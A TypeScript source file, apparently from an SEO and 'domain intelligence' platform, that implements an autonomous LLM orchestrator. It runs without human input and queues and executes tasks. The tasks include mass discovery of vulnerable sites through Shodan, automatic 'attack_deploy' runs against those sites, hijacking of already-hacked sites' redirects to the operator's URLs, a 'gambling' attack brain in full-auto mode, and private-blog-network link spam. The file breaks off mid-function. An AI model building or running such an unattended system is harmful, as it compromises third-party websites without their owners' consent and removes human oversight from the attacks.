/**
 * ═══════════════════════════════════════════════════════════════
 *  MASTER AI ORCHESTRATOR — The Central Brain
 *  
 *  Fully Autonomous Agentic AI that:
 *  1. OBSERVE — Collects state from all subsystems (SEO, Attack, PBN, Discovery, Rank)
 *  2. ORIENT — Analyzes situation, identifies priorities, spots opportunities
 *  3. DECIDE — Uses LLM to make strategic decisions on what to do next
 *  4. ACT — Creates tasks, dispatches to subsystems, monitors execution
 *  
 *  Runs on a configurable interval (default 30 min) without human input.
 *  All decisions are logged with reasoning for full transparency.
 * ═══════════════════════════════════════════════════════════════
 */
import { getDb } from "./db";
import { sanitizeDomain } from "./job-runner";
import { invokeLLM } from "./_core/llm";
import { sendTelegramNotification } from "./telegram-notifier";
import { ENV } from "./_core/env";
import {
  aiOrchestratorState,
  aiTaskQueue,
  aiDecisions,
  aiMetrics,
  seoProjects,
  pbnSites,
  pbnPosts,
  deployHistory,
  rankTracking,
  campaigns,
  domainScans,
  orders,
  autobidRules,
  watchlist,
  seoAgentTasks,
  seoContent,
  scheduledScans,
  autonomousDeploys,
  type AiOrchestratorStateRow,
  type AiTaskQueueRow,
  hackedSiteDetections,
} from "../drizzle/schema";
import { eq, desc, sql, and, gte, lte, count, isNull, or } from "drizzle-orm";
import {
  emitStateChanged,
  emitCycleStart,
  emitCyclePhase,
  emitCycleComplete,
  emitCycleError,
  emitTaskQueued,
  emitTaskStarted,
  emitTaskCompleted,
  emitTaskFailed,
  emitDecisionMade,
  emitMetricsUpdate,
} from "./orchestrator-sse";

// ─── Types ───
export interface WorldState {
  timestamp: number;
  seo: {
    totalProjects: number;
    activeProjects: number;
    projectsNeedingAttention: { id: number; domain: string; issue: string }[];
    recentRankChanges: { domain: string; keyword: string; oldRank: number; newRank: number }[];
    contentPending: number;
    backlinksBuiltToday: number;
  };
  attack: {
    totalDeploys: number;
    successfulDeploys: number;
    failedDeploys: number;
    recentDeploys: { domain: string; status: string; createdAt: Date }[];
    activePipelines: number;
  };
  pbn: {
    totalSites: number;
    activeSites: number;
    downSites: number;
    recentPosts: number;
    sitesNeedingContent: { id: number; name: string; lastPost: Date | null }[];
  };
  discovery: {
    targetsDiscoveredToday: number;
    highValueTargets: number;
  };
  rank: {
    totalTracked: number;
    improved: number;
    declined: number;
    unchanged: number;
  };
  autobid: {
    activeRules: number;
    totalBudgetRemaining: number;
    recentBids: number;
  };
  tasks: {
    queued: number;
    running: number;
    completedToday: number;
    failedToday: number;
  };
  hackedSites: {
    totalDetected: number;
    awaitingTakeover: number;
    takenOver: number;
    highPriority: number;
    pendingVerification: number;
    verifiedSuccess: number;
    verifiedReverted: number;
  };
}

export interface OrchestratorDecision {
  subsystem: string;
  action: string;
  reasoning: string;
  confidence: number;
  priority: "critical" | "high" | "medium" | "low";
  tasks: {
    taskType: string;
    title: string;
    description: string;
    targetDomain?: string;
    projectId?: number;
    priority: "critical" | "high" | "medium" | "low";
    scheduledFor?: string;
  }[];
}

// ─── Singleton State ───
let orchestratorInterval: ReturnType<typeof setInterval> | null = null;
let isRunningCycle = false;

// ═══════════════════════════════════════════════
//  DB HELPERS
// ═══════════════════════════════════════════════

export async function getOrCreateOrchestratorState(): Promise<AiOrchestratorStateRow> {
  const [existing] = await (await getDb())!.select().from(aiOrchestratorState).limit(1);
  if (existing) return existing;
  
  await (await getDb())!.insert(aiOrchestratorState).values({});
  const [created] = await (await getDb())!.select().from(aiOrchestratorState).limit(1);
  return created!;
}

async function updateOrchestratorState(updates: Partial<Record<string, unknown>>) {
  const state = await getOrCreateOrchestratorState();
  await (await getDb())!.update(aiOrchestratorState).set(updates as any).where(eq(aiOrchestratorState.id, state.id));
}

async function logDecision(
  cycle: number,
  phase: string,
  subsystem: string,
  decision: string,
  reasoning: string,
  confidence: number,
  inputData: unknown,
  outputData: unknown,
  tasksCreated: number,
  impactLevel: string
) {
  await (await getDb())!.insert(aiDecisions).values({
    cycle,
    phase,
    subsystem,
    decision,
    reasoning,
    confidence,
    inputData,
    outputData,
    tasksCreated,
    impactLevel,
  });
}

async function createTask(task: {
  taskType: string;
  subsystem: string;
  title: string;
  description?: string;
  targetDomain?: string;
  projectId?: number;
  priority?: "critical" | "high" | "medium" | "low";
  aiReasoning?: string;
  scheduledFor?: Date;
  dependsOnTaskId?: number;
}) {
  const [result] = await (await getDb())!.insert(aiTaskQueue).values({
    taskType: task.taskType,
    subsystem: task.subsystem,
    title: task.title,
    description: task.description,
    targetDomain: task.targetDomain,
    projectId: task.projectId,
    priority: task.priority || "medium",
    aiReasoning: task.aiReasoning,
    scheduledFor: task.scheduledFor,
    dependsOnTaskId: task.dependsOnTaskId,
  });
  return result;
}

// ═══════════════════════════════════════════════
//  PHASE 1: OBSERVE — Collect World State
// ═══════════════════════════════════════════════

async function observe(): Promise<WorldState> {
  const now = new Date();
  const todayStart = new Date(now.getFullYear(), now.getMonth(), now.getDate());

  // SEO Projects
  const allSeoProjects = await (await getDb())!.select({
    id: seoProjects.id,
    domain: seoProjects.domain,
    status: seoProjects.status,
  }).from(seoProjects).limit(100);

  const activeProjects = allSeoProjects.filter((p: typeof allSeoProjects[number]) => p.status === "analyzing" || p.status === "setup");
  
  // SEO content pending
  const [contentPendingResult] = await (await getDb())!.select({ count: count() })
    .from(seoContent)
    .where(eq(seoContent.publishStatus, "draft"));
  
  // Recent rank changes
  const recentRanks = await (await getDb())!.select()
    .from(rankTracking)
    .orderBy(desc(rankTracking.trackedAt))
    .limit(20);
  
  const rankChanges = recentRanks
    .filter((r: typeof recentRanks[number]) => r.previousPosition && r.position && r.previousPosition !== r.position)
    .map((r: typeof recentRanks[number]) => ({
      domain: `project-${r.projectId}`,
      keyword: r.keyword,
      oldRank: r.previousPosition || 0,
      newRank: r.position || 0,
    }));

  // Attack/Deploy stats
  const allDeploys = await (await getDb())!.select({
    domain: deployHistory.targetDomain,
    status: deployHistory.status,
    createdAt: deployHistory.createdAt,
  }).from(deployHistory).orderBy(desc(deployHistory.createdAt)).limit(50);

  const successDeploys = allDeploys.filter((d: typeof allDeploys[number]) => d.status === "success");
  const failedDeploys = allDeploys.filter((d: typeof allDeploys[number]) => d.status === "failed");

  // PBN Sites
  const allPbn = await (await getDb())!.select().from(pbnSites).limit(100);
  const activePbn = allPbn.filter((s: typeof allPbn[number]) => s.status === "active");
  const downPbn = allPbn.filter((s: typeof allPbn[number]) => s.status === "down" || s.status === "error");
  
  const sitesNeedingContent = activePbn
    .filter((s: typeof allPbn[number]) => {
      if (!s.lastPost) return true;
      const daysSincePost = (now.getTime() - new Date(s.lastPost).getTime()) / (1000 * 60 * 60 * 24);
      return daysSincePost > 3;
    })
    .map((s: typeof allPbn[number]) => ({ id: s.id, name: s.name, lastPost: s.lastPost }));

  // Rank tracking summary
  const [rankImproved] = await (await getDb())!.select({ count: count() })
    .from(rankTracking)
    .where(sql`${rankTracking.position} < ${rankTracking.previousPosition}`);
  const [rankDeclined] = await (await getDb())!.select({ count: count() })
    .from(rankTracking)
    .where(sql`${rankTracking.position} > ${rankTracking.previousPosition}`);
  const [rankTotal] = await (await getDb())!.select({ count: count() }).from(rankTracking);

  // Auto-bid rules
  const activeRules = await (await getDb())!.select().from(autobidRules).where(eq(autobidRules.status, "active"));
  const totalBudgetRemaining = activeRules.reduce((sum: number, r: typeof activeRules[number]) => {
    return sum + (parseFloat(String(r.totalBudget)) - parseFloat(String(r.spent)));
  }, 0);

  // Hacked Sites Detection stats
  const allHackedSites = await (await getDb())!.select({
    isHacked: hackedSiteDetections.isHacked,
    takeoverStatus: hackedSiteDetections.takeoverStatus,
    priority: hackedSiteDetections.priority,
    verificationStatus: hackedSiteDetections.verificationStatus,
  }).from(hackedSiteDetections);
  const hackedOnly = allHackedSites.filter(s => s.isHacked);
  const awaitingTakeover = hackedOnly.filter(s => s.takeoverStatus === "not_attempted");
  const takenOver = hackedOnly.filter(s => s.takeoverStatus === "success");
  const highPriority = hackedOnly.filter(s => s.priority >= 8);
  const pendingVerification = hackedOnly.filter(s => s.verificationStatus === "pending");
  const verifiedSuccess = hackedOnly.filter(s => s.verificationStatus === "verified_success");
  const verifiedReverted = hackedOnly.filter(s => s.verificationStatus === "verified_reverted");

  // Task queue stats
  const [queuedTasks] = await (await getDb())!.select({ count: count() })
    .from(aiTaskQueue).where(eq(aiTaskQueue.status, "queued"));
  const [runningTasks] = await (await getDb())!.select({ count: count() })
    .from(aiTaskQueue).where(eq(aiTaskQueue.status, "running"));
  const [completedToday] = await (await getDb())!.select({ count: count() })
    .from(aiTaskQueue)
    .where(and(eq(aiTaskQueue.status, "completed"), gte(aiTaskQueue.completedAt, todayStart)));
  const [failedToday] = await (await getDb())!.select({ count: count() })
    .from(aiTaskQueue)
    .where(and(eq(aiTaskQueue.status, "failed"), gte(aiTaskQueue.completedAt, todayStart)));

  return {
    timestamp: Date.now(),
    seo: {
      totalProjects: allSeoProjects.length,
      activeProjects: activeProjects.length,
      projectsNeedingAttention: [],
      recentRankChanges: rankChanges,
      contentPending: contentPendingResult?.count || 0,
      backlinksBuiltToday: 0,
    },
    attack: {
      totalDeploys: allDeploys.length,
      successfulDeploys: successDeploys.length,
      failedDeploys: failedDeploys.length,
      recentDeploys: allDeploys.slice(0, 5).map((d: typeof allDeploys[number]) => ({
        domain: d.domain,
        status: d.status,
        createdAt: d.createdAt,
      })),
      activePipelines: 0,
    },
    pbn: {
      totalSites: allPbn.length,
      activeSites: activePbn.length,
      downSites: downPbn.length,
      recentPosts: 0,
      sitesNeedingContent,
    },
    discovery: {
      targetsDiscoveredToday: 0,
      highValueTargets: 0,
    },
    rank: {
      totalTracked: rankTotal?.count || 0,
      improved: rankImproved?.count || 0,
      declined: rankDeclined?.count || 0,
      unchanged: (rankTotal?.count || 0) - (rankImproved?.count || 0) - (rankDeclined?.count || 0),
    },
    autobid: {
      activeRules: activeRules.length,
      totalBudgetRemaining,
      recentBids: 0,
    },
    tasks: {
      queued: queuedTasks?.count || 0,
      running: runningTasks?.count || 0,
      completedToday: completedToday?.count || 0,
      failedToday: failedToday?.count || 0,
    },
    hackedSites: {
      totalDetected: hackedOnly.length,
      awaitingTakeover: awaitingTakeover.length,
      takenOver: takenOver.length,
      highPriority: highPriority.length,
      pendingVerification: pendingVerification.length,
      verifiedSuccess: verifiedSuccess.length,
      verifiedReverted: verifiedReverted.length,
    },
  };
}

// ═══════════════════════════════════════════════
//  PHASE 2: ORIENT — AI Analyzes the Situation
// ═══════════════════════════════════════════════

async function orient(worldState: WorldState, orchState: AiOrchestratorStateRow): Promise<string> {
  const enabledSystems: string[] = [];
  if (orchState.seoEnabled) enabledSystems.push("SEO");
  if (orchState.attackEnabled) enabledSystems.push("Attack");
  if (orchState.pbnEnabled) enabledSystems.push("PBN");
  if (orchState.discoveryEnabled) enabledSystems.push("Discovery");
  if (orchState.rankTrackingEnabled) enabledSystems.push("Rank Tracking");
  if (orchState.autobidEnabled) enabledSystems.push("Auto-Bid");

  const prompt = `You are the Master AI Orchestrator for FridayAI x DomainSlayer — a fully autonomous SEO & domain intelligence platform.

CURRENT WORLD STATE:
${JSON.stringify(worldState, null, 2)}

ENABLED SUBSYSTEMS: ${enabledSystems.join(", ")}
AGGRESSIVENESS: ${orchState.aggressiveness}
MAX CONCURRENT TASKS: ${orchState.maxConcurrentTasks}
MAX DAILY ACTIONS: ${orchState.maxDailyActions}
ACTIONS TODAY: ${orchState.todayActions}
REMAINING ACTIONS: ${orchState.maxDailyActions - orchState.todayActions}
CYCLE: #${orchState.currentCycle + 1}

PREVIOUS LEARNINGS:
${orchState.aiLearnings ? JSON.stringify(orchState.aiLearnings) : "None yet — first cycle"}

PREVIOUS PRIORITIES:
${orchState.aiPriorities ? JSON.stringify(orchState.aiPriorities) : "None yet"}

Analyze the current situation and provide a strategic assessment. Consider:
1. What subsystems need immediate attention?
2. What opportunities exist right now?
3. What risks or problems need to be addressed?
4. What's the optimal allocation of remaining daily actions?
5. Are there any patterns or trends to leverage?

Respond with a concise strategic analysis (max 500 words).`;

  const response = await invokeLLM({
    messages: [
      { role: "system", content: "You are an autonomous AI strategist. Be concise, actionable, and data-driven." },
      { role: "user", content: prompt },
    ],
  });

  const content = response.choices[0]?.message?.content;
  return typeof content === "string" ? content : "No analysis generated";
}

// ═══════════════════════════════════════════════
//  PHASE 3: DECIDE — AI Makes Strategic Decisions
// ═══════════════════════════════════════════════

async function decide(
  worldState: WorldState,
  analysis: string,
  orchState: AiOrchestratorStateRow
): Promise<OrchestratorDecision[]> {
  const remainingActions = orchState.maxDailyActions - orchState.todayActions;
  if (remainingActions <= 0) return [];

  const enabledSystems: string[] = [];
  if (orchState.seoEnabled) enabledSystems.push("seo");
  if (orchState.attackEnabled) enabledSystems.push("attack");
  if (orchState.attackEnabled) enabledSystems.push("redirect_takeover"); // Auto-enable with attack
  if (orchState.attackEnabled) enabledSystems.push("gambling_brain"); // Auto-enable gambling AI brain with attack
  if (orchState.pbnEnabled) enabledSystems.push("pbn");
  if (orchState.discoveryEnabled) enabledSystems.push("discovery");
  if (orchState.rankTrackingEnabled) enabledSystems.push("rank");
  if (orchState.autobidEnabled) enabledSystems.push("autobid");

  const taskTypes: Record<string, string[]> = {
    seo: ["seo_analyze", "seo_build_backlinks", "seo_create_content", "seo_on_page", "seo_check_ranks", "seo_adjust_strategy"],
    attack: ["attack_discover", "attack_scan", "attack_deploy", "attack_verify"],
    pbn: ["pbn_auto_post", "pbn_interlink", "pbn_health_check"],
    discovery: ["discovery_search", "discovery_score", "discovery_queue_attack"],
    rank: ["rank_check", "rank_bulk_check", "rank_competitor_analysis"],
    autobid: ["autobid_scan", "autobid_analyze", "autobid_execute"],
    redirect_takeover: ["takeover_scan_targets", "takeover_batch_scan", "takeover_execute", "takeover_scan_serp_targets", "takeover_verify_pending"],
    gambling_brain: ["gambling_run_cycle", "gambling_keyword_intel", "gambling_smart_discovery", "gambling_auto_attack"],
  };

  const prompt = `You are the Master AI Orchestrator. Based on your analysis, decide what actions to take.

STRATEGIC ANALYSIS:
${analysis}

WORLD STATE SUMMARY:
- SEO: ${worldState.seo.activeProjects} active projects, ${worldState.seo.contentPending} content pending
- PBN: ${worldState.pbn.activeSites} active sites, ${worldState.pbn.sitesNeedingContent.length} need content
- Rank: ${worldState.rank.improved} improved, ${worldState.rank.declined} declined
- Tasks: ${worldState.tasks.queued} queued, ${worldState.tasks.running} running
- Attack: ${worldState.attack.successfulDeploys} successful deploys
- Hacked Sites: ${worldState.hackedSites.totalDetected} detected, ${worldState.hackedSites.awaitingTakeover} awaiting takeover, ${worldState.hackedSites.highPriority} high-priority
- Verification: ${worldState.hackedSites.pendingVerification} pending, ${worldState.hackedSites.verifiedSuccess} verified success, ${worldState.hackedSites.verifiedReverted} reverted (need re-takeover)

ENABLED SUBSYSTEMS: ${enabledSystems.join(", ")}
REMAINING ACTIONS TODAY: ${remainingActions}
MAX CONCURRENT: ${orchState.maxConcurrentTasks}
CURRENTLY RUNNING: ${worldState.tasks.running}
AGGRESSIVENESS: ${orchState.aggressiveness}

AVAILABLE TASK TYPES PER SUBSYSTEM:
${Object.entries(taskTypes)
  .filter(([sys]) => enabledSystems.includes(sys))
  .map(([sys, types]) => `${sys}: ${types.join(", ")}`)
  .join("\n")}

Create a list of decisions. Each decision should create 1-3 tasks.
Only create tasks for ENABLED subsystems.
Don't exceed remaining actions or concurrent task limit.
Prioritize based on aggressiveness level and current needs.

Respond in this exact JSON format:
{
  "decisions": [
    {
      "subsystem": "seo",
      "action": "Build backlinks for top project",
      "reasoning": "Project X has declining ranks, needs backlink boost",
      "confidence": 85,
      "priority": "high",
      "tasks": [
        {
          "taskType": "seo_build_backlinks",
          "title": "Build 5 backlinks for example.com",
          "description": "Create contextual backlinks from PBN and guest posts",
          "targetDomain": "example.com",
          "priority": "high"
        }
      ]
    }
  ]
}`;

  try {
    const response = await invokeLLM({
      messages: [
        { role: "system", content: "You are an autonomous AI decision-maker. Respond ONLY with valid JSON. No markdown, no explanation." },
        { role: "user", content: prompt },
      ],
      response_format: {
        type: "json_schema",
        json_schema: {
          name: "orchestrator_decisions",
          strict: true,
          schema: {
            type: "object",
            properties: {
              decisions: {
                type: "array",
                items: {
                  type: "object",
                  properties: {
                    subsystem: { type: "string" },
                    action: { type: "string" },
                    reasoning: { type: "string" },
                    confidence: { type: "integer" },
                    priority: { type: "string", enum: ["critical", "high", "medium", "low"] },
                    tasks: {
                      type: "array",
                      items: {
                        type: "object",
                        properties: {
                          taskType: { type: "string" },
                          title: { type: "string" },
                          description: { type: "string" },
                          targetDomain: { type: "string" },
                          priority: { type: "string", enum: ["critical", "high", "medium", "low"] },
                        },
                        required: ["taskType", "title", "description", "priority"],
                        additionalProperties: false,
                      },
                    },
                  },
                  required: ["subsystem", "action", "reasoning", "confidence", "priority", "tasks"],
                  additionalProperties: false,
                },
              },
            },
            required: ["decisions"],
            additionalProperties: false,
          },
        },
      },
    });

    const rawContent = response.choices[0]?.message?.content;
    if (!rawContent || typeof rawContent !== "string") return [];
    
    const parsed = JSON.parse(rawContent);
    return parsed.decisions || [];
  } catch (err) {
    console.error("[Orchestrator] Decision phase error:", err);
    return [];
  }
}

// ═══════════════════════════════════════════════
//  PHASE 4: ACT — Execute Decisions
// ═══════════════════════════════════════════════

async function act(decisions: OrchestratorDecision[], cycle: number): Promise<number> {
  let totalTasksCreated = 0;

  for (const decision of decisions) {
    // Log the decision
    await logDecision(
      cycle,
      "decide",
      decision.subsystem,
      decision.action,
      decision.reasoning,
      decision.confidence,
      null,
      decision,
      decision.tasks.length,
      decision.priority
    );

    // Create tasks
    for (const task of decision.tasks) {
      await createTask({
        taskType: task.taskType,
        subsystem: decision.subsystem,
        title: task.title,
        description: task.description,
        targetDomain: task.targetDomain,
        priority: task.priority,
        aiReasoning: decision.reasoning,
      });
      totalTasksCreated++;
    }
  }

  return totalTasksCreated;
}

// ═══════════════════════════════════════════════
//  TASK EXECUTOR — Process queued tasks
// ═══════════════════════════════════════════════

async function processTaskQueue(maxConcurrent: number) {
  // Get currently running tasks
  const [runningResult] = await (await getDb())!.select({ count: count() })
    .from(aiTaskQueue)
    .where(eq(aiTaskQueue.status, "running"));
  
  const currentlyRunning = runningResult?.count || 0;
  const slotsAvailable = maxConcurrent - currentlyRunning;
  
  if (slotsAvailable <= 0) return;

  // Get next tasks to run (ordered by priority, then creation time)
  const priorityOrder = sql`CASE ${aiTaskQueue.priority} 
    WHEN 'critical' THEN 1 
    WHEN 'high' THEN 2 
    WHEN 'medium' THEN 3 
    WHEN 'low' THEN 4 
    ELSE 5 END`;

  const nextTasks = await (await getDb())!.select()
    .from(aiTaskQueue)
    .where(
      and(
        eq(aiTaskQueue.status, "queued"),
        or(
          isNull(aiTaskQueue.scheduledFor),
          lte(aiTaskQueue.scheduledFor, new Date())
        )
      )
    )
    .orderBy(priorityOrder, aiTaskQueue.createdAt)
    .limit(slotsAvailable);

  const taskDb = await getDb();
  if (!taskDb) return;

  for (const task of nextTasks) {
    try {
      // Mark as running
      await taskDb.update(aiTaskQueue)
        .set({ status: "running", startedAt: new Date() })
        .where(eq(aiTaskQueue.id, task.id));
      emitTaskStarted(task.id, task.taskType);

      // Execute the task based on type
      const result = await executeTask(task);

      // Mark as completed
      await taskDb.update(aiTaskQueue)
        .set({
          status: "completed",
          completedAt: new Date(),
          result: result,
        })
        .where(eq(aiTaskQueue.id, task.id));
      emitTaskCompleted(task.id, task.taskType, result);

    } catch (err: any) {
      const errorMsg = err?.message || String(err);
      const newRetry = task.retryCount + 1;
      
      if (newRetry >= task.maxRetries) {
        await taskDb.update(aiTaskQueue)
          .set({ status: "failed", error: errorMsg, completedAt: new Date() })
          .where(eq(aiTaskQueue.id, task.id));
        emitTaskFailed(task.id, task.taskType, errorMsg);
      } else {
        await taskDb.update(aiTaskQueue)
          .set({ status: "queued", error: errorMsg, retryCount: newRetry })
          .where(eq(aiTaskQueue.id, task.id));
        emitTaskFailed(task.id, task.taskType, `${errorMsg} (retry ${newRetry}/${task.maxRetries})`);
      }
    }
  }
}

async function executeTask(task: AiTaskQueueRow): Promise<Record<string, unknown>> {
  const { taskType, subsystem, targetDomain: rawTargetDomain, projectId } = task;
  // Sanitize targetDomain to ensure it's a bare domain
  const targetDomain = rawTargetDomain ? sanitizeDomain(rawTargetDomain) : rawTargetDomain;

  try {
    // ─── SEO Tasks — call real engines ───
    if (subsystem === "seo" || taskType.startsWith("seo_")) {
      if (projectId) {
        const { runDailyAutomation } = await import("./seo-daily-engine");
        const report = await runDailyAutomation(projectId);
        return { action: taskType, status: "completed", completed: report.summary.completed, total: report.summary.total };
      }
      const { runAllProjectsDailyTasks } = await import("./seo-agent");
      const result = await runAllProjectsDailyTasks();
      return { action: taskType, status: "completed", ...result };
    }

    // ─── Attack Tasks — call AI Commander or Auto-Pipeline ───
    if (subsystem === "attack" || taskType.startsWith("attack_")) {
      if (taskType === "attack_deploy" && targetDomain) {
        const { runAiCommander } = await import("./ai-autonomous-engine");
        const result = await runAiCommander({
          targetDomain,
          redirectUrl: targetDomain, // self-redirect for autonomous
          maxIterations: 5,
          pipelineType: "autonomous",
        });
        return { action: taskType, status: result.success ? "completed" : "failed", iterations: result.iterations, method: result.successfulMethod };
      }
      if (taskType === "attack_discover") {
        const { runAutoPipeline } = await import("./auto-pipeline");
        const run = await runAutoPipeline({
          discovery: { useShodan: true, useSerpApi: true, minVulnScore: 30, maxTargets: 50 },
          autoAttack: true,
          maxConcurrentAttacks: 3,
          attackOnlyAboveScore: 50,
          skipWaf: false,
          runNonWpScan: true,
          notifyTelegram: true,
        });
        return { action: taskType, status: "completed", pipelineId: run.id, phase: run.phase };
      }
      if (taskType === "attack_scan" && task.dependsOnTaskId) {
        const { runScanNow } = await import("./scan-scheduler");
        await runScanNow(task.dependsOnTaskId);
        return { action: taskType, status: "completed" };
      }
      return { action: taskType, status: "dispatched" };
    }

    // ─── Discovery Tasks — call Mass Discovery ───
    if (subsystem === "discovery" || taskType.startsWith("discovery_")) {
      const { runMassDiscovery } = await import("./mass-target-discovery");
      const result = await runMassDiscovery({
        useShodan: true,
        useSerpApi: true,
        minVulnScore: 30,
        maxTargets: 100,
      });
      return { action: taskType, status: "completed", totalRaw: result.totalRawResults, totalFiltered: result.totalAfterFilter };
    }

    // ─── PBN Tasks ───
    if (subsystem === "pbn" || taskType.startsWith("pbn_")) {
      // PBN tasks are handled through SEO daily engine
      if (projectId) {
        const { runDailyAutomation } = await import("./seo-daily-engine");
        const report = await runDailyAutomation(projectId);
        return { action: taskType, status: "completed", completed: report.summary.completed };
      }
      return { action: taskType, status: "dispatched" };
    }

    // ─── Rank Tasks ───
    if (subsystem === "rank" || taskType.startsWith("rank_")) {
      if (projectId) {
        const { runDailyAutomation } = await import("./seo-daily-engine");
        const report = await runDailyAutomation(projectId);
        return { action: taskType, status: "completed", completed: report.summary.completed };
      }
      return { action: taskType, status: "dispatched" };
    }

    // ─── Auto-Bid Tasks ───
    if (subsystem === "autobid" || taskType.startsWith("autobid_")) {
      return { action: taskType, status: "dispatched" };
    }

    // ─── Redirect Takeover Tasks ───
    if (subsystem === "redirect_takeover" || taskType.startsWith("takeover_")) {
      const { detectExistingRedirects, executeRedirectTakeover } = await import("./redirect-takeover");
      
      if (taskType === "takeover_scan_targets" || taskType === "takeover_batch_scan" || taskType === "takeover_scan_serp_targets") {
        // Scan SERP-discovered targets for existing hacks
        const db = (await getDb())!;
        const targets = await db.select({
          id: hackedSiteDetections.id,
          domain: hackedSiteDetections.domain,
          url: hackedSiteDetections.url,
        }).from(hackedSiteDetections)
          .where(eq(hackedSiteDetections.takeoverStatus, "not_attempted"))
          .limit(10);
        
        if (targets.length === 0) {
          // Try to discover new hacked sites from SERP targets
          const serpTargets = await db.select({
            domain: deployHistory.targetDomain,
          }).from(deployHistory)
            .where(eq(deployHistory.status, "success"))
            .orderBy(desc(deployHistory.createdAt))
            .limit(20);
          
          let scanned = 0;
          for (const t of serpTargets) {
            if (!t.domain) continue;
            try {
              const detection = await detectExistingRedirects(`https://${t.domain}`);
              if (detection.detected && detection.methods.length > 0) {
                await db.insert(hackedSiteDetections).values({
                  domain: t.domain,
                  url: `https://${t.domain}`,
                  isHacked: true,
                  competitorUrl: detection.competitorUrl,
                  detectionMethods: detection.methods.map(m => ({
                    type: m.type, location: m.location, competitorUrl: m.competitorUrl,
                    confidence: m.confidence, details: m.details, rawSnippet: m.rawSnippet,
                  })),
                  targetPlatform: detection.targetPlatform,
                  wpVersion: detection.wpVersion,
                  plugins: detection.plugins,
                  priority: detection.methods.some(m => m.confidence === "high") ? 10 : 5,
                  takeoverStatus: "not_attempted",
                  source: "agentic_discovery",
                }).onDuplicateKeyUpdate({ set: {
                  isHacked: true,
                  competitorUrl: detection.competitorUrl,
                  detectionMethods: detection.methods.map(m => ({
                    type: m.type, location: m.location, competitorUrl: m.competitorUrl,
                    confidence: m.confidence, details: m.details, rawSnippet: m.rawSnippet,
                  })),
                  scannedAt: new Date(),
                }});
                scanned++;
              }
            } catch {}
          }
          return { action: taskType, status: "completed", scannedDomains: serpTargets.length, newHackedFound: scanned };
        }
        
        let scanned = 0;
        for (const t of targets) {
          try {
            const detection = await detectExistingRedirects(t.url);
            await db.update(hackedSiteDetections).set({
              isHacked: detection.detected && detection.methods.length > 0,
              competitorUrl: detection.competitorUrl,
              detectionMethods: detection.methods.map(m => ({
                type: m.type, location: m.location, competitorUrl: m.competitorUrl,
                confidence: m.confidence, details: m.details, rawSnippet: m.rawSnippet,
              })),
              targetPlatform: detection.targetPlatform,
              wpVersion: detection.wpVersion,
              plugins: detection.plugins,
              scannedAt: new Date(),
            }).where(eq(hackedSiteDetections.id, t.id));
            scanned++;
          } catch {}
        }
        return { action: taskType, status: "completed", scanned };
      }
      
      if (taskType === "takeover_execute" && targetDomain) {
        const detection = await detectExistingRedirects(`https://${targetDomain}`);
        if (!detection.detected || detection.methods.length === 0) {
          return { action: taskType, status: "skipped", reason: "Site not detected as hacked" };
        }
        // Get redirect URL from pool
        const db2 = (await getDb())!;
        const { redirectUrlPool } = await import("../drizzle/schema");
        const redirectUrls = await db2.select({ url: redirectUrlPool.url })
          .from(redirectUrlPool)
          .where(eq(redirectUrlPool.isActive, true))
          .limit(1);
        const ourRedirectUrl = redirectUrls.length > 0 ? redirectUrls[0].url : `https://${targetDomain}`;
        
        const results = await executeRedirectTakeover({
          targetUrl: `https://${targetDomain}`,
          ourRedirectUrl,
        });
        const anySuccess = results.some(r => r.success);
        const successMethod = results.find(r => r.success)?.method || "none";
        // Update DB
        const db = (await getDb())!;
        await db.update(hackedSiteDetections).set({
          takeoverStatus: anySuccess ? "success" : "failed",
          takeoverMethod: successMethod,
          takeoverResult: JSON.stringify(results),
          takeoverAt: new Date(),
          ourRedirectUrl: ourRedirectUrl,
        }).where(eq(hackedSiteDetections.domain, targetDomain));
        
        // Auto-schedule verification if takeover succeeded
        if (anySuccess) {
          try {
            const { scheduleVerification } = await import("./takeover-verifier");
            const { desc: descOrd } = await import("drizzle-orm");
            const [site] = await db.select({ id: hackedSiteDetections.id })
              .from(hackedSiteDetections)
              .where(eq(hackedSiteDetections.domain, targetDomain))
              .orderBy(descOrd(hackedSiteDetections.id))
              .limit(1);
            if (site) {
              await scheduleVerification(site.id, ourRedirectUrl);
              console.log(`[Orchestrator] Verification scheduled for ${targetDomain} (site #${site.id})`);
            }
          } catch (e: any) {
            console.error(`[Orchestrator] Failed to schedule verification:`, e?.message);
          }
        }
        
        return { action: taskType, status: anySuccess ? "completed" : "failed", method: successMethod, results: results.length };
      }
      
      // ─── Takeover Verification (background) ───
      if (taskType === "takeover_verify_pending") {
        const { processPendingVerifications } = await import("./takeover-verifier");
        const verifyResult = await processPendingVerifications();
        console.log(`[Orchestrator] Verification processed: ${verifyResult.processed} sites (${verifyResult.verified} verified, ${verifyResult.reverted} reverted, ${verifyResult.retried} retried)`);
        return { action: taskType, status: "completed", ...verifyResult };
      }
      
      return { action: taskType, status: "dispatched" };
    }

    // ─── Gambling AI Brain ───
    if (subsystem === "gambling_brain" || taskType.startsWith("gambling_")) {
      const { runBrainCycle, getBrainState } = await import("./gambling-ai-brain");
      const { runFullIntelligenceCycle } = await import("./gambling-keyword-intel");
      const { runSmartGamblingDiscovery } = await import("./smart-target-discovery");
      
      if (taskType === "gambling_run_cycle") {
        // Full autonomous cycle: keywords → discovery → attack
        const brainState = getBrainState();
        if (brainState.isRunning) {
          console.log(`[Orchestrator] Gambling brain already running, skipping`);
          return { action: taskType, status: "skipped", reason: "already_running" };
        }
        runBrainCycle({ attackMode: "full_auto" }).catch(e => {
          console.error(`[Orchestrator] Gambling brain cycle error:`, e);
        });
        return { action: taskType, status: "dispatched" };
      }
      
      if (taskType === "gambling_keyword_intel") {
        const result = await runFullIntelligenceCycle();
        console.log(`[Orchestrator] Keyword intel: ${result.scored} scored, ${result.expanded.newKeywords} expanded`);
        return { action: taskType, status: "completed", ...result };
      }
      
      if (taskType === "gambling_smart_discovery") {
        const result = await runSmartGamblingDiscovery();
        console.log(`[Orchestrator] Smart discovery: ${result.totalUniqueTargets} targets found`);
        return { action: taskType, status: "completed", targetsFound: result.totalUniqueTargets };
      }
      
      if (taskType === "gambling_auto_attack") {
        // Run brain cycle in attack-only mode (skip keyword/discovery phases)
        const brainState = getBrainState();
        if (brainState.isRunning) {
          return { action: taskType, status: "skipped", reason: "already_running" };
        }
        runBrainCycle({ attackMode: "full_auto", expandKeywords: false }).catch(e => {
          console.error(`[Orchestrator] Gambling auto-attack error:`, e);
        });
        return { action: taskType, status: "dispatched" };
      }
      
      return { action: taskType, status: "dispatched" };
    }

    // ─── Platform Discovery & BL Building ───
    if (subsystem === "platform_discovery" || taskType.startsWith("platform_")) {
